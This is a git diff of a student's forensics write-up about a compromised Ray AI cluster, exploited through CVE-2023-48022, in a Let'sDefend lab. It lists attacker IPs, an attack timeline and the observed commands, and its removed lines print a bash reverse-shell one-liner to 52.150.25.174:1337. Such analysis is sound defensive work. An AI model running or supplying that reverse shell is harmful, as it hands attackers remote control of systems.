@@ -1,31 +1,44 @@
-# Compromised AI Cluster
+# Compromised AI Cluster - Network Forensics Write-up
 
-This repository contains my investigation of a compromised Ray AI Cluster where an exposed Ray Job Submission API was abused to achieve Remote Code Execution (CVE-2023-48022), establish a reverse shell, collect sensitive information, exfiltrate data, and perform internal network reconnaissance.
+Investigation of a compromised **Ray AI Cluster** from the Let'sDefend network forensics lab.
 
-## Skills Demonstrated
+The objective of this investigation was to identify the attacker's activity, reconstruct the attack timeline, analyze command execution, investigate data exfiltration, and assess the impact on the AI cluster.
 
-- Incident Response
-- Network Traffic Analysis
-- Wireshark
-- Threat Hunting
-- Linux Investigation
-- MITRE ATT&CK Mapping
-- IOC Identification
-- Timeline Reconstruction
 
-# Ray AI Cluster Investigation
 
-> Malware Traffic Analysis – Ray AI Cluster Compromise
+## Key Findings
 
-[![View PDF](./Ray_AI_Cluster_Investigation.pdf)](./Ray_AI_Cluster_Investigation.pdf)
+| Category | Finding |
+| --- | --- |
+| AI Framework | Ray 2.8.0 |
+| Exposed Service | 3.72.0.226:8265 |
+| Vulnerability | CVE-2023-48022 |
+| Initial Attacker | 104.28.245.2 |
+| Reverse Shell | 52.150.25.174:1337 |
+| Exfiltration Server | 104.28.213.2 |
+| Network Scan | TCP SYN Scan |
 
 ---
 
-## Overview
+## Attack Timeline
 
-An unusual increase in traffic was detected on an externally exposed Ray AI cluster. Network analysis revealed that an attacker exploited the exposed environment, executed remote commands, established a reverse shell, performed reconnaissance, exfiltrated sensitive data, and conducted network scanning activities.
-
-This investigation was performed using **Wireshark** and focused on identifying the attack sequence, malicious infrastructure, and the overall impact on the Ray cluster.
+```text
+Ray API Exposure
+        ↓
+CVE-2023-48022 Exploitation
+        ↓
+Remote Command Execution
+        ↓
+Reverse Shell Establishment
+        ↓
+Reconnaissance
+        ↓
+Secret File Collection
+        ↓
+Data Exfiltration
+        ↓
+TCP SYN Port Scan
+```
 
 ---
 
@@ -35,73 +48,16 @@ This investigation was performed using **Wireshark** and focused on identifying 
 - HTTP Stream Analysis
 - TCP Stream Analysis
 - Endpoint Statistics
+- Let'sDefend Network Forensics Lab
 
 ---
 
-## Investigation Workflow
+## Author
 
-### 1. Ray Version Enumeration
+**Ashvin Aacharya**
 
-The attacker first queried the exposed Ray API to determine the running version.
+Cybersecurity learner focused on SOC analysis, malware analysis, threat detection, and blue team operations.
 
-**Evidence**
-
-- `GET /api/version`
-- Ray version identified: `2.8.0`
-
-**Screenshot**
-
-- Figure 3 — Ray Version Identification (`/api/version`)
-
----
-
-### 2. Remote Job Submission
-
-The attacker used the Ray Jobs API to submit commands for execution.
-
-**Evidence**
-
-- `POST /api/jobs`
-
-The API created a unique submission ID for each command.
-
-**Screenshot**
-
-- Figure 2 — HTTP POST Request to `/api/jobs`
-
----
-
-### 3. Command Execution and Reconnaissance
-
-After gaining code execution, the attacker executed several Linux commands to gather information.
-
-**Commands observed**
-
-- `whoami`
-- `ls`
-- `pwd`
-- `/usr/bin/pwd`
-- `wget`
-- `sudo ./ahcii`
-
-**Purpose**
-
-- Identify the current user.
-- List directory contents.
-- Determine the current working directory.
-- Download additional resources.
-
-**Screenshot**
-
-- Figure 4 — Job Submission Executing Linux Commands
-
----
-
-### 4. Reverse Shell Establishment
-
-The attacker established an interactive reverse shell using Bash.
-
-**Command observed**
-
-```bash
-/bin/bash -c "bash -i > /dev/tcp/52.150.25.174/1337 0<&1 1>&0 2>&0"
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue)](https://www.linkedin.com/in/ashvin-aacharya-a08553308)
+[![GitHub](https://img.shields.io/badge/GitHub-0xAshvin-black)](https://github.com/0xAshvin)
+[![X](https://img.shields.io/badge/X-@0xAshvin-black)](https://x.com/0xAshvin)
